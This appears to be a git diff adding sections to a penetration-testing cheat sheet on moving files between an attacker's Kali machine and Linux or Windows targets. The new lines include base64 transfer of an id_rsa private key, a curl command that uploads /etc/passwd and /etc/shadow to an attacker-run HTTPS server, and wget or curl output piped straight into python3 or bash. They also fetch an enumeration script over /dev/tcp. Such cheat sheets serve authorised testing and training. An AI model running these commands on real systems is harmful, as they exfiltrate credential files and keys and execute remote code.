@@ -752,6 +752,15 @@ PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64
 PS C:\> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 ```
 
+- Base64 Downloads (Kali -> Linux)
+
+```
+$ md5sum id_rsa
+$ cat id_rsa |base64 -w 0;echo
+$ echo -n '<base64_string>' | base64 -d > id_rsa
+$ md5sum id_rsa
+```
+
 - Base64 Uploads (Windows -> Kali)
 
 ```
@@ -759,6 +768,15 @@ PS C:\> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | se
 PS C:\> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 $ echo <base64_string> | base64 -d > hosts
 $ md5sum hosts 
+```
+
+- Base64 Uploads (Linux -> Kali)
+
+```
+$ md5sum id_rsa
+$ cat id_rsa |base64 -w 0;echo
+$ echo -n '<base64_string>' | base64 -d > id_rsa
+$ md5sum id_rsa
 ```
 
 - Netcat Downloads (Kali -> Windows)
@@ -794,13 +812,39 @@ $ php -r '$file = file_get_contents("http://<IP address>:8000/exploit.sh"); file
 - SCP Downloads (Kali -> Windows)
 
 ```
+$ sudo systemctl enable ssh
+$ sudo systemctl start ssh
 $ scp <user>@<IP address>:/tmp/exploit.exe C:\Temp\exploit.exe
+```
+
+- SCP Downloads (Kali -> Linux)
+
+```
+$ sudo systemctl enable ssh
+$ sudo systemctl start ssh
+$ scp <user>@<IP address>:/tmp/exploit.sh .
 ```
 
 - SCP Uploads (Windows -> Kali)
 
 ```
 C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
+```
+
+- SCP Uploads (Linux -> Kali)
+
+```
+C:\> scp /tmp/exploit.sh <user>@<IP address>:/tmp/exploit.sh
+```
+
+- Python Web Uploads over HTTPS (Linux -> Kali)
+
+```
+$ sudo python3 -m pip install --user uploadserver
+$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+$ mkdir https && cd https
+$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+$ curl -X POST https://<IP address>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 
 - PowerShell DownloadFile (Kali -> Windows)
@@ -921,6 +965,28 @@ Log in with USER and PASS first.
 ftp> USER anonymous
 ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
+```
+
+- Wget
+
+```
+$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+```
+
+- Curl
+
+```
+$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
+$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+
+- Bash (/dev/tcp)
+
+```
+$ exec 3<>/dev/tcp/10.10.10.32/80
+$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+$ cat <&3
 ```
 
 - Bitsadmin
